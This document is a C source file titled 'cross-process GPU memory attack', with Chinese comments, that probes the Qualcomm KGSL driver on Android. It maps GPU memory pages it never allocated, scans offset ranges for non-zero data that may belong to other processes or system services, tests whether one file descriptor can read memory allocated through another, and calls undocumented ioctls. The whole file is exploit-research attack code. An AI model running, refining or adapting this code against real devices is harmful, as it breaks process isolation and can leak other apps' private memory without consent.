/*
 * kgsl_cross_process_attack.c - 跨進程 GPU 記憶體攻擊
 *
 * 確認:
 * - 同一進程內的多個 fd 共享 GPU 記憶體表
 * - offset=0x1000 對應第 0 頁
 * - offset=0x2000 對應第 1 頁
 *
 * 接下來測試:
 * 1. 是否可以讀取未分配的 GPU 頁面
 * 2. 是否可以跨進程訪問 GPU 記憶體
 * 3. 是否可以訪問系統服務的 GPU 記憶體
 *
 * 編譯:
 * aarch64-linux-android31-clang -static -O2 -o kgsl_cross_process_attack kgsl_cross_process_attack.c
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <stdint.h>
#include <signal.h>
#include <setjmp.h>

#define IOCTL_GPUMEM_ALLOC 0xc018092f

static sigjmp_buf jmp_env;
static volatile int sig_received = 0;

void sig_handler(int sig)
{
    sig_received = sig;
    siglongjmp(jmp_env, 1);
}

int safe_read(void *ptr, uint64_t *out)
{
    sig_received = 0;
    if (sigsetjmp(jmp_env, 1) == 0)
    {
        *out = *(volatile uint64_t *)ptr;
        return 0;
    }
    return -1;
}

/*
 * 掃描大範圍的 offset，看看是否有可訪問的區域
 * 這可能發現其他進程分配的 GPU 記憶體
 */
void scan_gpu_memory_range()
{
    printf("\n=== Scanning GPU Memory Range ===\n");

    int fd = open("/dev/kgsl-3d0", O_RDWR);
    if (fd < 0)
    {
        printf("[-] Cannot open KGSL\n");
        return;
    }

    signal(SIGSEGV, sig_handler);
    signal(SIGBUS, sig_handler);

    int accessible = 0;
    int non_zero = 0;

    // 掃描大範圍
    // 0x1000 = 第 0 頁
    // 0x100000 = 第 255 頁
    // 0x1000000 = 第 4095 頁

    printf("[*] Scanning offset 0x1000 to 0x100000 (256 pages)...\n");

    for (uint64_t offset = 0x1000; offset <= 0x100000; offset += 0x1000)
    {
        void *ptr = mmap(NULL, 0x1000, PROT_READ,
                         MAP_SHARED, fd, offset);

        if (ptr != MAP_FAILED)
        {
            accessible++;

            uint64_t val;
            if (safe_read(ptr, &val) == 0 && val != 0)
            {
                non_zero++;

                // 只顯示前幾個有趣的
                if (non_zero <= 10)
                {
                    printf("    [+] offset=0x%lx: 0x%lx\n", offset, val);
                }
            }

            munmap(ptr, 0x1000);
        }
    }

    printf("[*] Accessible pages: %d\n", accessible);
    printf("[*] Non-zero pages: %d\n", non_zero);

    close(fd);
}

/*
 * 不分配任何記憶體，嘗試訪問 offset=0x1000
 * 如果成功，可能是訪問到其他進程的 GPU 記憶體
 */
void test_unallocated_access()
{
    printf("\n=== Testing Unallocated GPU Memory Access ===\n");

    // 打開新的 fd，不做任何分配
    int fd = open("/dev/kgsl-3d0", O_RDWR);
    if (fd < 0)
    {
        printf("[-] Cannot open KGSL\n");
        return;
    }

    signal(SIGSEGV, sig_handler);
    signal(SIGBUS, sig_handler);

    // 嘗試訪問 offset=0x1000 (不分配)
    void *ptr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                     MAP_SHARED, fd, 0x1000);

    if (ptr == MAP_FAILED)
    {
        printf("[-] mmap failed without allocation: %s\n", strerror(errno));
        close(fd);
        return;
    }

    printf("[+] mmap succeeded without allocation!\n");

    uint64_t val;
    if (safe_read(ptr, &val) == 0)
    {
        printf("[+] Read succeeded: 0x%lx\n", val);

        if (val != 0)
        {
            printf("[!!!] NON-ZERO data from unallocated region!\n");
            printf("[!!!] This could be another process's GPU memory!\n");
        }
    }
    else
    {
        printf("[-] Read failed (signal %d)\n", sig_received);
    }

    munmap(ptr, 0x1000);
    close(fd);
}

/*
 * 測試大量 offset 範圍，看看能訪問到什麼
 */
void probe_all_accessible_memory()
{
    printf("\n=== Probing All Accessible GPU Memory ===\n");

    int fd = open("/dev/kgsl-3d0", O_RDWR);
    if (fd < 0)
        return;

    signal(SIGSEGV, sig_handler);
    signal(SIGBUS, sig_handler);

    // 先分配一個，確認我們的範圍
    struct
    {
        uint64_t gpuaddr;
        uint64_t size;
        uint32_t flags;
        uint32_t padding;
    } req = {0};

    req.size = 0x1000;
    ioctl(fd, IOCTL_GPUMEM_ALLOC, &req);
    uint64_t our_gpuaddr = req.gpuaddr;
    printf("[*] Our allocation: 0x%lx\n", our_gpuaddr);

    // 嘗試訪問我們分配之前的頁面
    printf("\n[*] Trying to access pages before our allocation:\n");

    for (uint64_t offset = 0x1000; offset <= 0x10000; offset += 0x1000)
    {
        void *ptr = mmap(NULL, 0x1000, PROT_READ,
                         MAP_SHARED, fd, offset);

        if (ptr != MAP_FAILED)
        {
            uint64_t val;
            int read_ok = safe_read(ptr, &val) == 0;

            printf("    offset=0x%lx: mmap=OK, read=%s",
                   offset, read_ok ? "OK" : "FAIL");

            if (read_ok && val != 0)
            {
                printf(", value=0x%lx", val);
            }
            printf("\n");

            munmap(ptr, 0x1000);
        }
        else
        {
            printf("    offset=0x%lx: mmap=FAIL (%s)\n",
                   offset, strerror(errno));
        }
    }

    close(fd);
}

/*
 * 測試是否可以通過創建多個 fd 來擴展訪問範圍
 */
void test_multi_fd_extend()
{
    printf("\n=== Testing Multi-FD Access Extension ===\n");

    // fd1 分配第一個區塊
    int fd1 = open("/dev/kgsl-3d0", O_RDWR);
    if (fd1 < 0)
        return;

    struct
    {
        uint64_t gpuaddr;
        uint64_t size;
        uint32_t flags;
        uint32_t padding;
    } req = {0};

    req.size = 0x1000;
    ioctl(fd1, IOCTL_GPUMEM_ALLOC, &req);
    uint64_t fd1_addr = req.gpuaddr;
    printf("[*] fd1 allocated: 0x%lx\n", fd1_addr);

    // 在 fd1 的分配上寫入
    void *ptr1 = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                      MAP_SHARED, fd1, fd1_addr);
    if (ptr1 != MAP_FAILED)
    {
        *(volatile uint64_t *)ptr1 = 0x1111111111111111ULL;
    }

    // fd2 分配新的區塊
    int fd2 = open("/dev/kgsl-3d0", O_RDWR);
    if (fd2 < 0)
    {
        munmap(ptr1, 0x1000);
        close(fd1);
        return;
    }

    req.gpuaddr = 0;
    ioctl(fd2, IOCTL_GPUMEM_ALLOC, &req);
    uint64_t fd2_addr = req.gpuaddr;
    printf("[*] fd2 allocated: 0x%lx\n", fd2_addr);

    // 在 fd2 的分配上寫入
    void *ptr2 = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                      MAP_SHARED, fd2, fd2_addr);
    if (ptr2 != MAP_FAILED)
    {
        *(volatile uint64_t *)ptr2 = 0x2222222222222222ULL;
    }

    signal(SIGSEGV, sig_handler);
    signal(SIGBUS, sig_handler);

    // 測試: fd1 能否訪問 fd2 的區塊?
    printf("\n[*] Testing fd1 access to fd2's memory:\n");

    // 計算 fd2 區塊的 offset
    uint64_t fd2_page = (fd2_addr - 0x4000000000ULL) / 0x1000;
    uint64_t fd2_offset = (fd2_page + 1) * 0x1000;

    void *cross_ptr = mmap(NULL, 0x1000, PROT_READ,
                           MAP_SHARED, fd1, fd2_offset);

    if (cross_ptr != MAP_FAILED)
    {
        uint64_t val;
        if (safe_read(cross_ptr, &val) == 0)
        {
            printf("    fd1 can read fd2's offset 0x%lx: 0x%lx\n",
                   fd2_offset, val);

            if (val == 0x2222222222222222ULL)
            {
                printf("    [!!!] CONFIRMED: fd1 accessed fd2's GPU memory!\n");
            }
        }
        munmap(cross_ptr, 0x1000);
    }

    // 清理
    if (ptr1 != MAP_FAILED)
        munmap(ptr1, 0x1000);
    if (ptr2 != MAP_FAILED)
        munmap(ptr2, 0x1000);
    close(fd1);
    close(fd2);
}

/*
 * 嘗試使用 GPU_AUX_COMMAND 在共享記憶體上執行操作
 */
void test_gpu_command_on_shared()
{
    printf("\n=== Testing GPU Command on Shared Memory ===\n");

    int fd = open("/dev/kgsl-3d0", O_RDWR);
    if (fd < 0)
        return;

    // 分配 GPU 記憶體
    struct
    {
        uint64_t gpuaddr;
        uint64_t size;
        uint32_t flags;
        uint32_t padding;
    } alloc_req = {0};

    alloc_req.size = 0x10000; // 64KB

    if (ioctl(fd, IOCTL_GPUMEM_ALLOC, &alloc_req) < 0)
    {
        printf("[-] Alloc failed\n");
        close(fd);
        return;
    }

    printf("[+] Allocated: gpuaddr=0x%lx\n", alloc_req.gpuaddr);

    // 準備 GPU 命令
    // ioctl 0x58 = GPU_AUX_COMMAND
    struct
    {
        uint32_t cmdsize;
        uint32_t flags;
    } aux_cmd = {0};

    aux_cmd.cmdsize = 1;

    int ret = ioctl(fd, 0xc0200958, &aux_cmd);
    printf("[*] GPU_AUX_COMMAND result: %d (errno=%d)\n", ret, errno);

    close(fd);
}

/*
 * 嘗試利用 SYNCSOURCE_CREATE_FENCE (0x56)
 */
void test_syncsource_fence()
{
    printf("\n=== Testing SYNCSOURCE_CREATE_FENCE ===\n");

    int fd = open("/dev/kgsl-3d0", O_RDWR);
    if (fd < 0)
        return;

    // 結構可能是:
    // { uint32_t id; int fence_fd; }

    struct
    {
        uint32_t id;
        int fence_fd;
    } req = {0};

    int ret = ioctl(fd, 0xc0040956, &req);

    printf("[*] Result: ret=%d, errno=%d\n", ret, errno);
    printf("[*] id=%u, fence_fd=%d\n", req.id, req.fence_fd);

    if (ret == 0 && req.fence_fd >= 0)
    {
        printf("[+] Got fence fd! This could be used for signaling.\n");
        close(req.fence_fd);
    }

    close(fd);
}

int main()
{
    printf("=== KGSL Cross-Process Attack ===\n");
    printf("=================================\n");

    // 測試未分配記憶體訪問
    test_unallocated_access();

    // 探測所有可訪問的記憶體
    probe_all_accessible_memory();

    // 測試多 fd 擴展
    test_multi_fd_extend();

    // 掃描 GPU 記憶體範圍
    scan_gpu_memory_range();

    // 測試 syncsource fence
    test_syncsource_fence();

    // 測試 GPU 命令
    test_gpu_command_on_shared();

    return 0;
}
